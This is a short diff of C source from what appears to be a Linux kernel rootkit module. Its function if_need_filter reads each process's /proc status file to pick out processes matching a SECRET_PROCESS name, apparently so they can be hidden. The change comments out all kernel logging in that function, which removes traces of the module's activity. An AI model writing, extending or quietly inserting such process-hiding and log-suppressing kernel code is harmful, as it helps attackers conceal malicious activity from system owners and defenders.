@@ -82,12 +82,12 @@ int if_need_filter(char *d_name) {
     file_path = (char *)kmalloc(pid_len + 14, GFP_KERNEL);
 
     snprintf(file_path, pid_len + 14, "/proc/%s/status", d_name);
-    printk("%s\n", file_path);
+    //printk("%s\n", file_path);
     //filp_open — open file and return file pointer, from: https://docs.huihoo.com/linux/kernel/2.6.26/filesystems/re76.html
     //the 3rd argument: ignored unless O_CREAT is set
     fp = filp_open(file_path, O_RDONLY, 0);
     if (IS_ERR(fp)) {
-        printk("file open failed, file path: %s\n", file_path);
+        //printk("file open failed, file path: %s\n", file_path);
         goto out;
     }
     /* 
@@ -107,7 +107,7 @@ int if_need_filter(char *d_name) {
     vfs_read(fp, buf, 128, &f_pos);
     if (strstr(buf, SECRET_PROCESS)) {
         is_needed = 1;
-        printk("read: %s\n", buf);
+        //printk("read: %s\n", buf);
     }
     set_fs(fs);
     filp_close(fp, NULL);
